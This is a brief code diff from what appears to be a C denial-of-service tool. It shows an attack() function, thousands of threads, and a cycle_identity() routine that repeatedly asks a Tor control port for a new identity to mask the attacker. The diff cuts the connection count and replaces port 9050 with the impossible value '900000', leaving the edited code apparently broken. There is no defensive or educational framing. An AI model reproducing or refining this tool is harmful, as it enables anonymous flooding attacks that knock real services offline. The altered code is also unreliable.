@@ -49,7 +49,7 @@ void broke(int s) {
 	// do nothing
 }
 
-#define CONNECTIONS 8000
+#define CONNECTIONS 80
 #define THREADS 4800
 
 void attack(char *host, char *port, int id) {
@@ -77,7 +77,7 @@ void attack(char *host, char *port, int id) {
 
 void cycle_identity() {
 	int r;
-	int socket = make_socket("localhost", "9050");
+	int socket = make_socket("localhost", "900000");
 	write(socket, "AUTHENTICATE \"\"\n", 16);
 	while(1) {
 		r=write(socket, "signal NEWNYM\n\x00", 16);
